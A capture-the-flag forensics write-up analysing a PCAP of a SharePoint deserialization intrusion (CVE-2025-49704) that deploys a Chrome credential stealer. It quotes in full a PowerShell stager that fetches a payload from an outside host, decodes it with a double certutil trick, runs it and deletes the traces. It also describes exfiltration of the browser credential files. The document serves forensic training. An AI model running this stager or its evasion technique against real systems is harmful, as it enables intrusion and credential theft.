# Gimme Your Point - VCSPassport 2025

## Case Overview

**Challenge:** Gimme Your Point
**Points:** 1000
**Category:** Web Exploitation / Digital Forensics
**Event:** VCSPassport 2025
**Flag:** `VCSPassport{SH4R3_y0R_P$$wD}`

> *"Sniff sniff this traffic to get your POINT but do not SHARE it!!! ^^"*

This forensic investigation reconstructs a multi-stage intrusion chain captured in a PCAP file. The attack leverages **CVE-2025-49704** — a critical SharePoint deserialization vulnerability in the ToolShell component — to achieve remote code execution, deploy a credential-stealing implant, and exfiltrate Chrome browser credentials to an attacker-controlled server.

![Challenge description](../../img/vcspassport2025/image1.png)

---

## MITRE ATT&CK Mapping

| Technique ID | Name | Observed Activity |
|---|---|---|
| `T1190` | Exploit Public-Facing Application | SharePoint CVE-2025-49704 deserialization via `MSOTlPn_DWP` parameter |
| `T1059.001` | PowerShell | Payload staging and execution through `Invoke-WebRequest` + `certutil` chain |
| `T1140` | Deobfuscate/Decode Files or Information | Double `certutil -decode` to reconstruct the executable from a certificate-disguised blob |
| `T1555.003` | Credentials from Web Browsers | Theft of Chrome `Login Data` (SQLite) and `Local State` (encryption key) |
| `T1560.001` | Archive Collected Data | Password-protected ZIP creation for collected credentials |
| `T1041` | Exfiltration Over C2 Channel | HTTP POST multipart upload of the archived credentials to attacker server |
| `T1070.004` | File Deletion | Self-cleanup of staging artifacts (`raw_package`, `d1`, `health_check.exe`) |

---

## Forensic Analysis

### Phase 1: Network Traffic Acquisition & Initial Triage

The investigation begins with the provided PCAP file (`gimme_your_point.pcap`). Upon loading it into Wireshark, an initial scan of the packet stream reveals HTTP traffic between the victim host and a remote server at `30.243.67.129`. Notably, an HTTP GET request is observed returning a `start.aspx` page — an immediate indicator of a web application-based attack targeting a SharePoint environment.

![Wireshark PCAP overview showing HTTP GET request returning start.aspx](../../img/vcspassport2025/image2.png)

Further examination of the traffic reveals a POST request directed at `ToolPane.aspx`, carrying a suspicious `CompressedDataTable` parameter. This artifact stands out as anomalous and warrants deeper inspection.

![Wireshark showing POST request to ToolPane.aspx](../../img/vcspassport2025/image3.png)

To systematically analyze all transferred objects, Wireshark's **File > Export Objects > HTTP** feature is used to extract every HTTP object from the capture. This yields the following artifacts:

| Packet | Hostname | Content Type | Size | Filename |
|---|---|---|---|---|
| 13 | 30.243.67.129 | text/html | 24 KB | `start.aspx` |
| 22 | 30.243.67.129 | application/x-www-form-urlencoded | 4,221 bytes | `ToolPane.aspx` |
| 25 | 30.243.67.129 | text/plain | 16 bytes | `ToolPane.aspx` |
| 383 | 30.243.67.128:1234 | application/octet-stream | 5,257 KB | `raw_package` |
| 547 | 30.243.67.128:8000 | multipart/form-data | 299 KB | `upload` |
| 549 | 30.243.67.128:8000 | application/json | 147 bytes | `upload` |

![Wireshark HTTP Object Export dialog](../../img/vcspassport2025/image4.png)

After saving all exported files, preliminary triage is performed using `strings` and `file` commands to characterize each artifact. Within the `ToolPane.aspx` form-urlencoded body, a Base64-encoded `CompressedDataTable` value is immediately flagged as suspicious.

---

### Phase 2: Vulnerability Identification — CVE-2025-49704 (ToolShell)

Searching for the keyword **"CompressedDataTable SharePoint"** leads to a critical intelligence source: a security advisory published by Viettel Cyber Security (VCS) documenting **ToolShell** — a severe SharePoint vulnerability chain actively exploited in the wild.

The challenge is confirmed to simulate **CVE-2025-49704**, wherein an attacker embeds a deserialization payload (XML/serialized .NET object) into the `MSOTlPn_DWP` parameter of a POST request targeting SharePoint's ToolPane endpoint. Upon deserialization by the server, the payload achieves arbitrary code execution — the initial foothold of this intrusion.

---

### Phase 3: Payload Extraction & Deobfuscation

#### 3.1 — Decompressing the CompressedDataTable

The `CompressedDataTable` value extracted from `ToolPane.aspx` is loaded into CyberChef for analysis.

![CyberChef — ToolPane.aspx content with CompressedDataTable value](../../img/vcspassport2025/image5.png)

Applying the standard SharePoint deserialization decoding pipeline:

1. **Base64 Decode** — strips the transport encoding
2. **GZIP Decompress** — recovers the original serialized payload

This yields a .NET deserialized XML structure containing a malicious shell invocation.

![Python script performing Base64 decode + GZIP decompression of CompressedDataTable](../../img/vcspassport2025/image6.png)

#### 3.2 — Extracting the PowerShell Stager

Within the decompressed payload, the `<MethodParameters>` node contains another Base64-encoded string. Decoding this in CyberChef reveals the actual attack command — a **PowerShell stager** responsible for downloading, reconstructing, and executing the implant:

![CyberChef — Base64 decoding of MethodParameters revealing PowerShell command](../../img/vcspassport2025/image7.png)

The recovered PowerShell command:

```powershell
powershell -c "Invoke-WebRequest -Uri http://30.243.67.128:1234/raw_package -OutFile C:\Windows\Temp\raw_package;
Add-Content -Path C:\Windows\Temp\raw_package -Value bGVYQjFibU4wU1dOTVlqRkZSVVVBDQotLS0tLUVORCBDRVJUSUZJQ0FURS0tLS0t -Encoding UTF8;
Add-Content -Path C:\Windows\Temp\raw_package -Value DQo= -Encoding UTF8;
Add-Content -Path C:\Windows\Temp\raw_package -Value '-----END CERTIFICATE-----' -Encoding UTF8;
certutil -decode C:\Windows\Temp\raw_package C:\Windows\Temp\d1;
certutil -decode C:\Windows\Temp\d1 C:\Windows\Temp\health_check.exe;
del C:\Windows\Temp\raw_package;
del C:\Windows\Temp\d1;
C:\Windows\Temp\health_check.exe;
sleep 10;
del C:\Windows\Temp\health_check.exe"
```

#### 3.3 — Attack Chain Reconstruction

The stager operates in a precise sequence designed to evade detection:

| Step | Action | Purpose |
|---|---|---|
| 1 | `Invoke-WebRequest` downloads `raw_package` from `30.243.67.128:1234` | Retrieve the disguised payload from C2 |
| 2 | `Add-Content` appends Base64 padding + PEM trailer | Complete the fake certificate structure to make `raw_package` a valid PEM-encoded blob |
| 3 | First `certutil -decode` → `d1` | Strip the PEM envelope, recovering an intermediate Base64-encoded binary |
| 4 | Second `certutil -decode` → `health_check.exe` | Decode the final executable from the intermediate blob |
| 5 | `del raw_package`, `del d1` | Anti-forensics: remove staging artifacts |
| 6 | Execute `health_check.exe` | Deploy the credential stealer |
| 7 | `sleep 10`, then `del health_check.exe` | Allow execution to complete, then destroy the implant binary |

This double `certutil` decode technique is a well-documented Living-off-the-Land Binary (LOLBin) evasion method — the payload masquerades as a PEM certificate at rest, bypassing naive content-based detection.

---

### Phase 4: Implant Behavioral Analysis

Following the stager's logic step by step, the final artifact `health_check.exe` is reconstructed. Upon execution in an isolated environment, the implant reveals its true behavior:

**Observation 1:** The implant invokes 7-Zip internally to create a password-protected archive in `C:\Windows\Temp\`, using a GUID-named directory.

![Execution of health_check.exe — 7-Zip archiving 2 files (291,212 bytes) into Temp](../../img/vcspassport2025/image8.png)

**Observation 2:** A folder with GUID `{8E2FF114-0F24-4222-85B6-A86144C5157E}` is created, alongside its compressed `.zip` counterpart.

![Windows Explorer — GUID-named folder and ZIP archive in Temp](../../img/vcspassport2025/image9.png)

**Observation 3:** Inside the GUID folder, two files are staged for exfiltration:

| File | Size | Identification |
|---|---|---|
| `chrome_health_result` | 40 KB | Chrome `Login Data` — SQLite database storing saved usernames and passwords |
| `chrome_service_result` | 245 KB | Chrome `Local State` — JSON file containing the DPAPI-encrypted key required to decrypt Login Data entries |

![Contents of the staging folder — chrome_health_result and chrome_service_result](../../img/vcspassport2025/image10.png)

**Verification — `chrome_health_result`:** Opening the file in a text editor confirms the SQLite magic header (`SQLite format 3`), consistent with Chrome's `Login Data` database structure.

![chrome_health_result opened in Notepad — SQLite format header visible](../../img/vcspassport2025/image11.png)

**Verification — `chrome_service_result`:** This file contains a JSON structure beginning with Chrome's characteristic `accessibility`, `autofill`, and `states_data_dir` fields — confirming it as the Chrome `Local State` file. The `os_crypt.encrypted_key` within this file is the AES-256-GCM key (DPAPI-protected) used to decrypt credential entries in `Login Data`.

![chrome_service_result opened in Notepad — Chrome Local State JSON structure](../../img/vcspassport2025/image12.png)

Together, these two files provide everything an attacker needs to decrypt and exfiltrate all saved browser credentials.

---

### Phase 5: Exfiltration Channel Discovery

Returning to the PCAP for further evidence, a previously unexamined HTTP POST request to the `/upload` endpoint on `30.243.67.128:8000` is identified. This is the exfiltration channel.

![Wireshark — POST /upload request showing the exfiltrated data](../../img/vcspassport2025/image14.png)

Examining the raw bytes of the uploaded content, the file begins with signature `50 4B 03 04` — the unmistakable magic bytes of a **ZIP archive**. The file entry headers within the archive confirm the presence of `chrome_health_result` and `chrome_service_result`.

![Hex dump of the exfiltrated upload — PK signature (50 4B 03 04) and archived file names visible](../../img/vcspassport2025/image13.png)

The exfiltrated ZIP is extracted from the PCAP stream, renamed with a `.zip` extension, and an extraction attempt is made — only to be met with a **password prompt**. The archive is password-protected.

![WinRAR password prompt when attempting to extract the exfiltrated ZIP](../../img/vcspassport2025/image15.png)

---

### Phase 6: Confirming Password-Protected Exfiltration

Recalling that `health_check.exe` creates a local ZIP archive during execution, a test extraction of that locally generated archive is attempted. The same password prompt appears — confirming that the implant embeds a hardcoded password used to protect the exfiltrated archive.

![WinRAR password prompt for the locally generated ZIP — same protection mechanism](../../img/vcspassport2025/image16.png)

This means the ZIP password is baked into the `health_check.exe` binary itself.

---

### Phase 7: Static Analysis — Password Recovery via Reverse Engineering

The binary is loaded into **IDA Pro** for static analysis. A string search for the keyword `"pass"` reveals three functions of immediate interest:

- `GenPass1`
- `GenPass2`
- `GenPass3`

These functions are clearly responsible for constructing the ZIP archive password at runtime.

![IDA Pro — Function list showing GenPass1, GenPass2, GenPass3](../../img/vcspassport2025/image17.png)

Following the cross-references into the `.data` segment (IDA View-A), the password fragments are located as UTF-16LE string literals:

![IDA View-A — Data segment revealing password components: "passw...d", "S(ReT", "w0r"](../../img/vcspassport2025/image18.png)

After reconstructing and testing several combinations of the identified fragments, the full password is recovered:

```
sup3r_S3(ReT_p4$$wod
```

---

### Phase 8: Flag Recovery

With the recovered password, the exfiltrated ZIP archive is successfully extracted.

![WinRAR — successful extraction with password sup3r_S3(ReT_p4$$w0d](../../img/vcspassport2025/image19.png)

The `chrome_health_result` SQLite database is opened and its contents examined. Within the `logins` table — where Chrome stores saved credentials — a URL entry is discovered:

```
https://flag.win.here/SH4R3_y0R_P$$wD
```

![chrome_health_result opened in text editor — flag URL highlighted](../../img/vcspassport2025/image20.png)

The path component of this URL is the flag value.

---

## Flag

```
VCSPassport{SH4R3_y0R_P$$wD}
```

---

## Intrusion Timeline Reconstruction

| Sequence | Activity | Evidence Source |
|---|---|---|
| T+0 | Attacker sends crafted POST to `ToolPane.aspx` with deserialization payload in `CompressedDataTable` | PCAP — Packet #22 |
| T+1 | SharePoint deserializes the payload, executing embedded PowerShell stager | Decoded payload from `CompressedDataTable` |
| T+2 | PowerShell downloads `raw_package` from `30.243.67.128:1234` | PCAP — Packet #383 |
| T+3 | Double `certutil -decode` reconstructs `health_check.exe` | PowerShell command analysis |
| T+4 | `health_check.exe` executes: copies Chrome credential files, creates password-protected ZIP | Behavioral analysis |
| T+5 | ZIP archive uploaded via POST to `30.243.67.128:8000/upload` | PCAP — Packet #547 |
| T+6 | Staging artifacts (`raw_package`, `d1`, `health_check.exe`) deleted | PowerShell command analysis |

---

## Tools Used

| Tool | Purpose |
|---|---|
| Wireshark | PCAP analysis, HTTP object export, traffic reconstruction |
| CyberChef | Base64 decoding, GZIP decompression, payload deobfuscation |
| Python | Scripting for CompressedDataTable decompression pipeline |
| IDA Pro | Static reverse engineering of `health_check.exe` for password recovery |
| 7-Zip / WinRAR | Password-protected archive extraction |
| strings / file | Initial artifact triage and characterization |

---

## References

- [VCS Security Advisory: ToolShell — Critical SharePoint Vulnerability Chain Exploited in the Wild](https://blog.viettelcybersecurity.com/toolshell-chuoi-lo-hong-sharepoint-nghiem-trong-dang-bi-khai-thac-trong-thuc-te/)
- CVE-2025-49704: SharePoint Deserialization Remote Code Execution
- MITRE ATT&CK: T1190, T1059.001, T1140, T1555.003, T1560.001, T1041, T1070.004
